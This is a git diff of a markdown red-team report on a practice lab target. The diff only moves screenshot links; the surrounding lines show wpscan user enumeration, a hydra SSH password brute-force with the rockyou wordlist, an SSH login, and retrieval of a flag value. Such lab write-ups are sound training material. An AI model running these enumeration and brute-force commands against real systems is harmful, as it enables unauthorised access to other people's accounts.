@@ -53,6 +53,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       WPSCAN Enumeration / HydraBruteForce
       - _TODO: Include the command run_
         - `$ wpscan --url http://192.168.1.110 --enumerate u`
+        ![wpscan_users](images/wpscan_users.png)
           -`hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh`
           ![hydra_michael](images/hydra_michael.png)
         - `ssh michael@192.168.1.110`
@@ -63,7 +64,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
   **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
-  ![flag2](images/flag2.png)
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       Directory Exploration
@@ -73,6 +73,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - `cd ../../var/www`
         - `ls`
         - `cat flag2.txt`
+        ![flag2](images/flag2.png)
   
 
   - `flag3.txt`: _TODO: Insert `flag3.txt` hash value_  
